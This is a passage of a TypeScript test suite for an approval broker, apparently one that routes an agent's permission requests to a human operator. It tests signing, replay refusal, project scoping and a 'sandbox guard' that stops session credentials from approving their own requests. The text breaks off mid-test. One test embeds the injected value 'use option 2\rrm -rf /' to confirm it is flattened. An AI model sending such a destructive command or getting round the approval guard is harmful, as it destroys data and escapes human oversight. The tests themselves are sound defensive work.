import { test, expect, describe, afterAll } from "bun:test";
import { Database } from "bun:sqlite";
import { mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import { startBroker, stopBroker, post, approvalListBody, type TestBroker } from "./_helper.ts";
import {
  approvalWaitTimeoutSec,
  buildAuthProof,
  capVisibly,
  deriveOperatorId,
  deriveTokenId,
  generateCredential,
  type ApprovalCredential,
} from "../shared/approval.ts";
import type { Approval } from "../shared/types.ts";
import { buildApprovalRequest } from "../desktop/hooks/approval-hook.ts";

const brokers: TestBroker[] = [];
afterAll(async () => {
  for (const b of brokers) await stopBroker(b);
});

async function boot(env: Record<string, string> = {}): Promise<TestBroker> {
  const b = await startBroker(env);
  brokers.push(b);
  return b;
}

/** An operator: a credential plus its self-certifying id. */
function newOperator(): { cred: ApprovalCredential; id: string } {
  const cred = generateCredential();
  return { cred, id: deriveOperatorId(cred.publicKey) };
}

/** Sign `payload` and POST it — the proof never covers itself. */
async function signedPost<T>(
  b: TestBroker,
  path: string,
  payload: Record<string, unknown>,
  signer: { cred: ApprovalCredential; operator_id: string; kind?: "operator" | "session"; token_id?: string }
): Promise<{ status: number; body: T }> {
  const kind = signer.kind ?? "operator";
  const body = {
    // project_key is set before the spread so it lands inside the signed
    // payload, while a test can still override it through the spread that
    // follows.
    // A field appended after signing would fail with a bad-signature 401 rather
    // than the intended 400.
    project_key: DEFAULT_PROJECT_KEY,
    ...payload,
    public_key: signer.cred.publicKey,
  } as Record<string, unknown>;
  // Passing `{ project_key: undefined }` is how a test asks for a body with NO
  // project_key at all, which is the case the mandatory-field refusal exists
  // for. Deleting rather than leaving `undefined`: the key has to be absent
  // from the object that gets CANONICALISED for the signature, not merely
  // absent from its JSON rendering, or the proof and the received body would
  // disagree and the test would measure a 401 instead of the 400 it means to.
  if (body.project_key === undefined) delete body.project_key;
  const auth = buildAuthProof(signer.cred.privateKey, body, {
    kind,
    operator_id: signer.operator_id,
    token_id: signer.token_id,
  });
  return post<T>(`${b.url}${path}`, { ...body, auth });
}

/** Matches addApproval's default origin.project_key below (card 4df14b5b). */
const DEFAULT_PROJECT_KEY = "github.com/vocsap/koryphaios";

async function addApproval(
  b: TestBroker,
  op: { cred: ApprovalCredential; id: string },
  overrides: Record<string, unknown> = {}
): Promise<Approval> {
  const res = await signedPost<{ approval: Approval }>(
    b,
    "/approval/add",
    {
      kind: "permission",
      title: "Run tests",
      question: "Allow `npm test`?",
      options: ["Yes", "No"],
      origin: { host: "bureau", project_key: DEFAULT_PROJECT_KEY },
      ...overrides,
    },
    { cred: op.cred, operator_id: op.id }
  );
  expect(res.status).toBe(200);
  return res.body.approval;
}

describe("approval lifecycle", () => {
  test("add parks a pending approval and echoes a public projection", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);

    expect(approval.status).toBe("pending");
    expect(approval.operator_id).toBe(op.id);
    expect(approval.options).toEqual(["Yes", "No"]);
    expect(approval.origin.host).toBe("bureau");
    // Hostile input #2: nothing token-ish or process-ish may cross the wire.
    const wire = JSON.stringify(approval);
    expect(wire).not.toContain("instance_token");
    expect(wire).not.toContain("from_token");
    expect(wire).not.toContain("pid");
  });

  test("claim settles it and records who won", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);

    const res = await signedPost<{ approval: Approval }>(
      b,
      "/approval/claim",
      { id: approval.id, via: "deck", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    expect(res.body.approval.status).toBe("answered");
    expect(res.body.approval.answered_via).toBe("deck");
    expect(res.body.approval.answered_at).toBeTruthy();
  });

  test("THE arbiter contract: the second claim gets 409", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);
    const signer = { cred: op.cred, operator_id: op.id };

    const first = await signedPost(
      b,
      "/approval/claim",
      { id: approval.id, via: "deck", answer_kind: "allow" },
      signer
    );
    const second = await signedPost<{ error: string }>(
      b,
      "/approval/claim",
      { id: approval.id, via: "telegram", answer_kind: "deny" },
      signer
    );
    expect(first.status).toBe(200);
    expect(second.status).toBe(409);
    expect(second.body.error).toBe("already-settled");
  });

  test("concurrent claims: exactly one wins", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);
    const signer = { cred: op.cred, operator_id: op.id };

    const results = await Promise.all(
      (["deck", "telegram", "discord", "ntfy"] as const).map((via) =>
        signedPost(b, "/approval/claim", { id: approval.id, via, answer_kind: "allow" }, signer)
      )
    );
    expect(results.filter((r) => r.status === 200)).toHaveLength(1);
    expect(results.filter((r) => r.status === 409)).toHaveLength(3);
  });

  test("a free-text answer is flattened before storage (PTY safety)", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op, { kind: "question" });

    const res = await signedPost<{ approval: Approval }>(
      b,
      "/approval/claim",
      {
        id: approval.id,
        via: "telegram",
        answer_kind: "text",
        answer_text: "use option 2\rrm -rf /",
      },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    expect(res.body.approval.answer_text).toBe("use option 2 rm -rf /");
    expect(res.body.approval.answer_text).not.toContain("\r");
  });

  test("a text answer without text is refused", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);
    const res = await signedPost(
      b,
      "/approval/claim",
      { id: approval.id, via: "deck", answer_kind: "text" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(400);
  });
});

describe("long poll (/approval/wait)", () => {
  test("returns as soon as a claim lands", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);
    const signer = { cred: op.cred, operator_id: op.id };

    const started = Date.now();
    const waiting = signedPost<{ approval?: Approval }>(
      b,
      "/approval/wait",
      { id: approval.id, timeout_sec: 30 },
      signer
    );
    // Give the long poll time to actually park before settling it.
    await Bun.sleep(150);
    await signedPost(b, "/approval/claim", { id: approval.id, via: "deck", answer_kind: "deny" }, signer);

    const res = await waiting;
    expect(res.status).toBe(200);
    expect(res.body.approval?.status).toBe("answered");
    expect(res.body.approval?.answer_kind).toBe("deny");
    // It must have been woken, not polled to completion.
    expect(Date.now() - started).toBeLessThan(10_000);
  });

  test("returns pending:true at timeout, leaving the approval untouched", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);

    const res = await signedPost<{ pending?: boolean }>(
      b,
      "/approval/wait",
      { id: approval.id, timeout_sec: 1 },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    expect(res.body.pending).toBe(true);

    const list = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody(DEFAULT_PROJECT_KEY),
      { cred: op.cred, operator_id: op.id }
    );
    expect(list.body.approvals[0]?.status).toBe("pending");
  });

  test("an already-settled approval returns immediately", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);
    const signer = { cred: op.cred, operator_id: op.id };
    await signedPost(b, "/approval/claim", { id: approval.id, via: "deck", answer_kind: "allow" }, signer);

    const res = await signedPost<{ approval?: Approval }>(
      b,
      "/approval/wait",
      { id: approval.id, timeout_sec: 30 },
      signer
    );
    expect(res.body.approval?.status).toBe("answered");
  });
});

describe("operator compartmentalisation", () => {
  test("operator B can neither see nor claim operator A's approval", async () => {
    const b = await boot();
    const a = newOperator();
    const other = newOperator();
    const approval = await addApproval(b, a);

    const list = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody(DEFAULT_PROJECT_KEY),
      { cred: other.cred, operator_id: other.id }
    );
    expect(list.status).toBe(200);
    expect(list.body.approvals).toHaveLength(0);

    const claim = await signedPost(
      b,
      "/approval/claim",
      { id: approval.id, via: "deck", answer_kind: "allow" },
      { cred: other.cred, operator_id: other.id }
    );
    // 404, not 403: never confirm that another operator's approval exists.
    expect(claim.status).toBe(404);

    const wait = await signedPost(
      b,
      "/approval/wait",
      { id: approval.id, timeout_sec: 1 },
      { cred: other.cred, operator_id: other.id }
    );
    expect(wait.status).toBe(404);
  });

  test("the same identity from two machines shares its approvals", async () => {
    // The multi-PC case: PC#2 enrolled with the same credential.
    const b = await boot();
    const op = newOperator();
    await addApproval(b, op, { origin: { host: "bureau" }, project_key: "p" });
    await addApproval(b, op, { origin: { host: "portable" }, project_key: "p" });

    const list = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody("p"),
      { cred: op.cred, operator_id: op.id }
    );
    expect(list.body.approvals).toHaveLength(2);
    expect(new Set(list.body.approvals.map((a) => a.origin.host))).toEqual(
      new Set(["bureau", "portable"])
    );
  });
});

// Card 4df14b5b: two Deck windows on two different repos were sharing the
// same operator_id and therefore the same Courrier, because project_key was
// write-only -- accepted on /approval/add, never demanded by /approval/list.
describe("project scoping (card 4df14b5b)", () => {
  // NOT a red-then-green proof of this card's fix by itself: the broker
  // already filtered correctly on project_key WHEN a caller supplied one --
  // that half of handleApprovalList predates this card and was never broken.
  // Kept as a regression guard for the mechanism the fix now depends on
  // (fetchPendingApprovals/fetchUndeliveredVerdicts always supplying it).
  test("two project_keys under the SAME operator do not see each other's approvals", async () => {
    const b = await boot();
    const op = newOperator();
    const a = await addApproval(b, op, { origin: { host: "bureau" }, project_key: "repo-a" });
    const c = await addApproval(b, op, { origin: { host: "bureau" }, project_key: "repo-b" });

    const listA = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody("repo-a"),
      { cred: op.cred, operator_id: op.id }
    );
    expect(listA.body.approvals.map((x) => x.id)).toEqual([a.id]);

    const listB = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody("repo-b"),
      { cred: op.cred, operator_id: op.id }
    );
    expect(listB.body.approvals.map((x) => x.id)).toEqual([c.id]);
  });

  test("a request without project_key is refused, not silently unioned across projects", async () => {
    const b = await boot();
    const op = newOperator();
    // Card 1def56da: the project of a NEW approval comes from the credential,
    // not from `origin.project_key` in the body -- that field was the defect,
    // since the party being filtered declared the dimension it was filtered on.
    // For an operator credential the declaration is the top-level `project_key`,
    // which is legitimate (the operator is the trusted party) and mandatory.
    await addApproval(b, op, { project_key: "repo-a" });
    await addApproval(b, op, { project_key: "repo-b" });

    const missing = await signedPost<{ error: string }>(
      b,
      "/approval/list",
      { project_key: undefined },
      { cred: op.cred, operator_id: op.id }
    );
    expect(missing.status).toBe(400);
    expect(missing.body.error).toBe("project_key is required");

    const empty = await signedPost<{ error: string }>(
      b,
      "/approval/list",
      { project_key: "" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(empty.status).toBe(400);
    expect(empty.body.error).toBe("project_key is required");
  });
});

describe("authentication", () => {
  test("an unsigned request is refused", async () => {
    const b = await boot();
    const res = await post(`${b.url}/approval/add`, {
      kind: "permission",
      title: "t",
      question: "q",
    });
    expect(res.status).toBe(401);
  });

  test("a tampered payload invalidates the signature", async () => {
    const b = await boot();
    const op = newOperator();
    const body = { kind: "permission", title: "ok", question: "q", public_key: op.cred.publicKey };
    const auth = buildAuthProof(op.cred.privateKey, body, {
      kind: "operator",
      operator_id: op.id,
    });
    const res = await post(`${b.url}/approval/add`, { ...body, title: "tampered", auth });
    expect(res.status).toBe(401);
  });

  test("a captured proof cannot be replayed (B8)", async () => {
    const b = await boot();
    const op = newOperator();
    const body = {
      kind: "permission",
      title: "replay me",
      question: "q",
      // Card 1def56da: mandatory for an operator credential, and it must be in
      // the object BEFORE buildAuthProof below -- the proof covers the body
      // minus its own `auth`, so a field appended afterwards produces a 401
      // bad-signature and this test would measure the wrong refusal.
      project_key: DEFAULT_PROJECT_KEY,
      public_key: op.cred.publicKey,
    };
    const auth = buildAuthProof(op.cred.privateKey, body, {
      kind: "operator",
      operator_id: op.id,
    });
    const first = await post(`${b.url}/approval/add`, { ...body, auth });
    const replay = await post<{ error: string }>(`${b.url}/approval/add`, { ...body, auth });
    expect(first.status).toBe(200);
    expect(replay.status).toBe(401);
    expect(replay.body.error).toBe("replayed-proof");
  });

  test("an operator_id that does not match the presented key is refused", async () => {
    const b = await boot();
    const op = newOperator();
    // operator_id is a digest OF the public key: claiming another id fails.
    const res = await signedPost(
      b,
      "/approval/add",
      { kind: "permission", title: "t", question: "q" },
      { cred: op.cred, operator_id: "0".repeat(16) }
    );
    expect(res.status).toBe(401);
  });
});

describe("session tokens (PLAN §6.8 — the sandbox guard)", () => {
  async function mintSession(
    b: TestBroker,
    op: { cred: ApprovalCredential; id: string },
    sessionRef: string
  ): Promise<{ cred: ApprovalCredential; token_id: string }> {
    const cred = generateCredential();
    const res = await signedPost<{ token_id: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: sessionRef },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    expect(res.body.token_id).toBe(deriveTokenId(cred.publicKey));
    return { cred, token_id: res.body.token_id };
  }

  test("a session credential can add for its own session", async () => {
    const b = await boot();
    const op = newOperator();
    const session = await mintSession(b, op, "tile-1");

    const res = await signedPost<{ approval: Approval }>(
      b,
      "/approval/add",
      { kind: "permission", title: "Bash", question: "Allow rm?", session_ref: "tile-1" },
      { cred: session.cred, operator_id: op.id, kind: "session", token_id: session.token_id }
    );
    expect(res.status).toBe(200);
    expect(res.body.approval.origin.session_ref).toBe("tile-1");
  });

  test("a session credential may NEVER claim — the escape guard", async () => {
    const b = await boot();
    const op = newOperator();
    const session = await mintSession(b, op, "tile-1");
    const approval = await addApproval(b, op);

    const res = await signedPost<{ error: string }>(
      b,
      "/approval/claim",
      { id: approval.id, via: "deck", answer_kind: "allow" },
      { cred: session.cred, operator_id: op.id, kind: "session", token_id: session.token_id }
    );
    expect(res.status).toBe(403);
    expect(res.body.error).toContain("may not claim");
  });

  test("a session credential cannot list the operator's approvals nor mint tokens", async () => {
    const b = await boot();
    const op = newOperator();
    const session = await mintSession(b, op, "tile-1");
    const signer = {
      cred: session.cred,
      operator_id: op.id,
      kind: "session" as const,
      token_id: session.token_id,
    };
    await addApproval(b, op);

    expect((await signedPost(b, "/approval/list", {}, signer)).status).toBe(403);
    expect(
      (await signedPost(b, "/approval/token-mint", { session_public_key: "x", session_ref: "y" }, signer))
        .status
    ).toBe(403);
  });

  test("a session credential cannot impersonate another session_ref", async () => {
    const b = await boot();
    const op = newOperator();
    const session = await mintSession(b, op, "tile-1");

    const res = await signedPost(
      b,
      "/approval/add",
      { kind: "permission", title: "t", question: "q", session_ref: "tile-2" },
      { cred: session.cred, operator_id: op.id, kind: "session", token_id: session.token_id }
    );
    expect(res.status).toBe(403);
  });

  test("a session credential cannot wait on another session's approval", async () => {
    const b = await boot();
    const op = newOperator();
    const session = await mintSession(b, op, "tile-1");
    const foreign = await addApproval(b, op, { session_ref: "tile-2" });

    const res = await signedPost(
      b,
      "/approval/wait",
      { id: foreign.id, timeout_sec: 1 },
      { cred: session.cred, operator_id: op.id, kind: "session", token_id: session.token_id }
    );
    expect(res.status).toBe(404);
  });

  test("a revoked session credential is refused", async () => {
    const b = await boot();
    const op = newOperator();
    const session = await mintSession(b, op, "tile-1");

    const revoke = await signedPost<{ revoked: number }>(
      b,
      "/approval/token-revoke",
      { session_ref: "tile-1" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(revoke.body.revoked).toBe(1);

    const res = await signedPost(
      b,
      "/approval/add",
      { kind: "permission", title: "t", question: "q" },
      { cred: session.cred, operator_id: op.id, kind: "session", token_id: session.token_id }
    );
    expect(res.status).toBe(401);
  });
});

describe("session token renewal", () => {
  async function mintSessionToken(
    b: TestBroker,
    op: { cred: ApprovalCredential; id: string },
    cred: ApprovalCredential,
    sessionRef: string,
    projectKey = DEFAULT_PROJECT_KEY
  ): Promise<{ token_id: string; expires_at: string; capabilities?: { renew_only?: boolean } }> {
    const res = await signedPost<{ token_id: string; expires_at: string; capabilities?: { renew_only?: boolean } }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: sessionRef, project_key: projectKey },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(200);
    return res.body;
  }

  test("renew_only extends the same live token and advertises its capability", async () => {
    const b = await boot();
    const op = newOperator();
    const cred = generateCredential();
    const first = await mintSessionToken(b, op, cred, "renew-live");
    const priorExpiresAt = new Date(Date.now() + 3_600_000).toISOString();
    const seeded = new Database(b.dbPath);
    seeded.run("UPDATE approval_session_tokens SET expires_at = ? WHERE token_id = ?", [priorExpiresAt, first.token_id]);
    seeded.close();

    const renew = await signedPost<{ token_id: string; expires_at: string; capabilities?: { renew_only?: boolean } }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: "renew-live", renew_only: true, ttl_hours: 24 },
      { cred: op.cred, operator_id: op.id }
    );

    expect(renew.status).toBe(200);
    expect(renew.body).toEqual({
      token_id: first.token_id,
      expires_at: expect.any(String),
      capabilities: { renew_only: true }
    });
    expect(Date.parse(renew.body.expires_at)).toBeGreaterThan(Date.parse(priorExpiresAt));
    const db = new Database(b.dbPath);
    const row = db
      .query("SELECT operator_id, public_key, session_ref, project_key, revoked_at FROM approval_session_tokens WHERE token_id = ?")
      .get(first.token_id) as {
      operator_id: string;
      public_key: string;
      session_ref: string;
      project_key: string;
      revoked_at: string | null;
    };
    db.close();
    expect(row).toEqual({
      operator_id: op.id,
      public_key: cred.publicKey,
      session_ref: "renew-live",
      project_key: DEFAULT_PROJECT_KEY,
      revoked_at: null
    });
  });

  test("renew_only fixes every renewed lease at 24 hours", async () => {
    const b = await boot();
    const op = newOperator();
    for (const requestedTtlHours of [1, 720]) {
      const cred = generateCredential();
      await mintSessionToken(b, op, cred, `renew-ttl-${requestedTtlHours}`);
      const beforeRenewal = Date.now();
      const renew = await signedPost<{ expires_at: string }>(
        b,
        "/approval/token-mint",
        {
          session_public_key: cred.publicKey,
          session_ref: `renew-ttl-${requestedTtlHours}`,
          renew_only: true,
          ttl_hours: requestedTtlHours
        },
        { cred: op.cred, operator_id: op.id }
      );
      const afterRenewal = Date.now();
      expect(renew.status).toBe(200);
      const expiresAt = Date.parse(renew.body.expires_at);
      expect(expiresAt).toBeGreaterThanOrEqual(beforeRenewal + 24 * 3600_000);
      expect(expiresAt).toBeLessThanOrEqual(afterRenewal + 24 * 3600_000 + 1);
    }
  });

  test("renew_only cannot revive a token after its revoke", async () => {
    const b = await boot();
    const op = newOperator();
    const cred = generateCredential();
    const first = await mintSessionToken(b, op, cred, "renew-revoked");
    const firstRenewal = await signedPost<{ token_id: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: "renew-revoked", renew_only: true },
      { cred: op.cred, operator_id: op.id }
    );
    expect(firstRenewal).toMatchObject({ status: 200, body: { token_id: first.token_id } });
    const revoke = await signedPost<{ revoked: number }>(
      b,
      "/approval/token-revoke",
      { token_id: first.token_id },
      { cred: op.cred, operator_id: op.id }
    );
    expect(revoke.body.revoked).toBe(1);

    const renew = await signedPost<{ error: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: "renew-revoked", renew_only: true },
      { cred: op.cred, operator_id: op.id }
    );

    expect(renew.status).toBe(409);
    const db = new Database(b.dbPath);
    const row = db.query("SELECT revoked_at FROM approval_session_tokens WHERE token_id = ?").get(first.token_id) as {
      revoked_at: string | null;
    };
    db.close();
    expect(row.revoked_at).toEqual(expect.any(String));
  });

  test("legacy mint revives the token and refreshes its project scope", async () => {
    const b = await boot();
    const op = newOperator();
    const cred = generateCredential();
    const first = await mintSessionToken(b, op, cred, "legacy-revive");
    const revoke = await signedPost<{ revoked: number }>(
      b,
      "/approval/token-revoke",
      { token_id: first.token_id },
      { cred: op.cred, operator_id: op.id }
    );
    expect(revoke.body.revoked).toBe(1);

    const reminted = await mintSessionToken(b, op, cred, "legacy-revive", "github.com/vocsap/refreshed-project");
    expect(reminted.token_id).toBe(first.token_id);
    const db = new Database(b.dbPath);
    const row = db.query("SELECT revoked_at, project_key FROM approval_session_tokens WHERE token_id = ?").get(first.token_id) as {
      revoked_at: string | null;
      project_key: string;
    };
    db.close();
    expect(row).toEqual({ revoked_at: null, project_key: "github.com/vocsap/refreshed-project" });
  });

  test("renew_only rejects each changed scope dimension without mutating the stored row", async () => {
    const b = await boot();
    const op = newOperator();
    const cred = generateCredential();
    const first = await mintSessionToken(b, op, cred, "renew-original");
    const before = new Database(b.dbPath);
    const beforeExpiresAt = (before.query("SELECT expires_at FROM approval_session_tokens WHERE token_id = ?").get(first.token_id) as {
      expires_at: string;
    }).expires_at;
    before.close();

    for (const payload of [
      { session_public_key: cred.publicKey, session_ref: "renew-other", renew_only: true },
      {
        session_public_key: cred.publicKey,
        session_ref: "renew-original",
        project_key: "github.com/vocsap/other-project",
        renew_only: true
      }
    ]) {
      const renew = await signedPost<{ error: string }>(
        b,
        "/approval/token-mint",
        payload,
        { cred: op.cred, operator_id: op.id }
      );
      expect(renew.status).toBe(409);
    }
    const db = new Database(b.dbPath);
    const row = db
      .query("SELECT session_ref, project_key, expires_at FROM approval_session_tokens WHERE token_id = ?")
      .get(first.token_id) as { session_ref: string; project_key: string; expires_at: string };
    db.close();
    expect(row).toEqual({ session_ref: "renew-original", project_key: DEFAULT_PROJECT_KEY, expires_at: beforeExpiresAt });
  });

  test("renew_only rejects an absent, expired, foreign, or corrupted token", async () => {
    const b = await boot();
    const op = newOperator();
    const cred = generateCredential();
    const absent = await signedPost<{ error: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: "renew-absent", renew_only: true },
      { cred: op.cred, operator_id: op.id }
    );
    expect(absent.status).toBe(409);
    const absentDb = new Database(b.dbPath);
    const absentRows = (absentDb.query("SELECT COUNT(*) AS count FROM approval_session_tokens").get() as { count: number }).count;
    absentDb.close();
    expect(absentRows).toBe(0);

    const first = await mintSessionToken(b, op, cred, "renew-checked");
    const beforeForeign = new Database(b.dbPath);
    const expiresBeforeForeign = (beforeForeign.query("SELECT expires_at FROM approval_session_tokens WHERE token_id = ?").get(first.token_id) as {
      expires_at: string;
    }).expires_at;
    beforeForeign.close();
    const foreign = newOperator();
    const foreignRenew = await signedPost<{ error: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: "renew-checked", renew_only: true },
      { cred: foreign.cred, operator_id: foreign.id }
    );
    expect(foreignRenew.status).toBe(409);
    const afterForeign = new Database(b.dbPath);
    const expiresAfterForeign = (afterForeign.query("SELECT expires_at FROM approval_session_tokens WHERE token_id = ?").get(first.token_id) as {
      expires_at: string;
    }).expires_at;
    afterForeign.close();
    expect(expiresAfterForeign).toBe(expiresBeforeForeign);

    const db = new Database(b.dbPath);
    db.run("UPDATE approval_session_tokens SET expires_at = ? WHERE token_id = ?", [
      new Date(Date.now() - 1_000).toISOString(),
      first.token_id
    ]);
    db.close();
    const expired = await signedPost<{ error: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: "renew-checked", renew_only: true },
      { cred: op.cred, operator_id: op.id }
    );
    expect(expired.status).toBe(409);

    const altered = new Database(b.dbPath);
    altered.run("UPDATE approval_session_tokens SET expires_at = ?, public_key = ? WHERE token_id = ?", [
      "2030-01-02T00:00:00.000Z",
      "different-public-key",
      first.token_id
    ]);
    altered.close();
    const mismatchedKey = await signedPost<{ error: string }>(
      b,
      "/approval/token-mint",
      { session_public_key: cred.publicKey, session_ref: "renew-checked", renew_only: true },
      { cred: op.cred, operator_id: op.id }
    );
    expect(mismatchedKey.status).toBe(409);
  });
});

describe("notification expiry (C-4: the notif expires, the session does not)", () => {
  test("an overdue pending approval flips to expired_notif but stays claimable by the Deck", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);

    // Backdate the deadline directly in SQLite (same trick as the message-TTL suite).
    const db = new Database(b.dbPath);
    db.run("UPDATE pending_approvals SET notif_expires_at = ? WHERE id = ?", [
      new Date(Date.now() - 3600_000).toISOString(),
      approval.id,
    ]);
    db.close();

    const admin = await fetch(`${b.url}/admin/purge-messages`);
    expect((await admin.json()).expired_approvals).toBe(1);

    const list = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody(DEFAULT_PROJECT_KEY),
      { cred: op.cred, operator_id: op.id }
    );
    expect(list.body.approvals[0]?.status).toBe("expired_notif");

    // The Deck may still settle it — the agent is still blocked on screen.
    const deckClaim = await signedPost(
      b,
      "/approval/claim",
      { id: approval.id, via: "deck", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(deckClaim.status).toBe(200);
  });

  test("retention purges a row answered in the terminal, never a pending one", async () => {
    const b = await boot();
    const op = newOperator();
    const terminal = await addApproval(b, op, { tile_ref: "tile-retention" });
    const pending = await addApproval(b, op, { tile_ref: "tile-retention-pending" });
    const closed = await signedPost(
      b,
      "/approval/claim",
      { id: terminal.id, via: "deck", terminal: true },
      { cred: op.cred, operator_id: op.id }
    );
    expect(closed.status).toBe(200);

    const db = new Database(b.dbPath);
    const longAgo = new Date(Date.now() - 400 * 86400_000).toISOString();
    db.run("UPDATE pending_approvals SET created_at = ? WHERE id IN (?, ?)", [longAgo, terminal.id, pending.id]);
    db.close();

    await fetch(`${b.url}/admin/purge-messages`);
    const check = new Database(b.dbPath);
    const left = (check.query("SELECT id FROM pending_approvals").all() as { id: string }[]).map((r) => r.id);
    check.close();
    expect(left, "a status missing from the purge list keeps its rows forever").not.toContain(terminal.id);
    expect(left).toContain(pending.id);
  });

  test("an expired notification can NOT be settled from a remote channel", async () => {
    const b = await boot();
    const op = newOperator();
    const approval = await addApproval(b, op);

    const db = new Database(b.dbPath);
    db.run("UPDATE pending_approvals SET status = 'expired_notif' WHERE id = ?", [approval.id]);
    db.close();

    const res = await signedPost(
      b,
      "/approval/claim",
      { id: approval.id, via: "telegram", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(409);
  });
});

describe("delivery bookkeeping", () => {
  test("undelivered_only surfaces answered-but-unapplied approvals, then clears", async () => {
    const b = await boot();
    const op = newOperator();
    const signer = { cred: op.cred, operator_id: op.id };
    const approval = await addApproval(b, op);
    await signedPost(b, "/approval/claim", { id: approval.id, via: "telegram", answer_kind: "allow" }, signer);

    const pending = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody(DEFAULT_PROJECT_KEY, { undelivered_only: true }),
      signer
    );
    expect(pending.body.approvals).toHaveLength(1);

    const marked = await signedPost<{ marked: number }>(
      b,
      "/approval/delivered",
      { ids: [approval.id] },
      signer
    );
    expect(marked.body.marked).toBe(1);

    const after = await signedPost<{ approvals: Approval[] }>(
      b,
      "/approval/list",
      approvalListBody(DEFAULT_PROJECT_KEY, { undelivered_only: true }),
      signer
    );
    expect(after.body.approvals).toHaveLength(0);
  });
});

describe("flood bound", () => {
  test("pending approvals are capped per operator", async () => {
    const b = await boot({ CLAUDE_PEERS_APPROVAL_MAX_PENDING: "3" });
    const op = newOperator();
    for (let i = 0; i < 3; i++) await addApproval(b, op);

    const overflow = await signedPost<{ error: string }>(
      b,
      "/approval/add",
      { kind: "permission", title: "one too many", question: "q" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(overflow.status).toBe(429);
  });
});

/**
 * Each test below isolates one handler's project scoping: removing only that
 * handler's filter turns just that test red, so together they form a coverage
 * matrix rather than four proofs of the same thing.
 */
describe("project scoping reaches every handler (card 1def56da)", () => {
  /** One operator, one approval filed under `repo-a`. The intruder is `repo-b`. */
  async function twoProjects(): Promise<{
    b: TestBroker;
    op: { cred: ApprovalCredential; id: string };
    mine: Approval;
  }> {
    const b = await boot();
    const op = newOperator();
    const mine = await addApproval(b, op, { project_key: "repo-a" });
    return { b, op, mine };
  }

  test("WAIT: another project's window cannot even observe the approval", async () => {
    const { b, op, mine } = await twoProjects();
    const foreign = await signedPost<{ error: string }>(
      b,
      "/approval/wait",
      { id: mine.id, project_key: "repo-b", timeout_sec: 1 },
      { cred: op.cred, operator_id: op.id }
    );
    // 404 and not 403: telling the other window "that exists but is not yours"
    // would itself confirm the existence of another project's question.
    expect(foreign.status).toBe(404);
    expect(foreign.body.error).toBe("unknown approval");

    // Negative control. Without it, a handler that 404s on EVERYTHING would
    // satisfy the assertion above, and the test would prove nothing at all.
    const own = await signedPost<{ approval?: Approval; pending?: boolean }>(
      b,
      "/approval/wait",
      { id: mine.id, project_key: "repo-a", timeout_sec: 1 },
      { cred: op.cred, operator_id: op.id }
    );
    expect(own.status).toBe(200);
  });

  test("CLAIM: another project's window cannot settle it", async () => {
    const { b, op, mine } = await twoProjects();
    const foreign = await signedPost<{ error: string }>(
      b,
      "/approval/claim",
      { id: mine.id, project_key: "repo-b", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(foreign.status).toBe(404);

    // The approval must still be settle-ABLE by its owner: a scope that refused
    // everyone would pass the line above and break the feature.
    const own = await signedPost<{ approval: Approval }>(
      b,
      "/approval/claim",
      { id: mine.id, project_key: "repo-a", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(own.status).toBe(200);
    expect(own.body.approval.status).toBe("answered");
  });

  test("CLAIM: an already-settled approval still says 409, not 404, to its owner", async () => {
    // The existence probe after a zero-row UPDATE gained the same clause. If it
    // had been left unscoped it would answer 409 for a FOREIGN row (leaking its
    // existence); if it had been dropped, the owner's second claim would
    // degrade from 409 to 404 and the Deck would report the wrong thing.
    const { b, op, mine } = await twoProjects();
    const first = await signedPost(
      b,
      "/approval/claim",
      { id: mine.id, project_key: "repo-a", answer_kind: "allow" },
      { cred: op.cred, operator_id: op.id }
    );
    expect(first.status).toBe(200);
    const again = await signedPost<{ error: string }>(
      b,
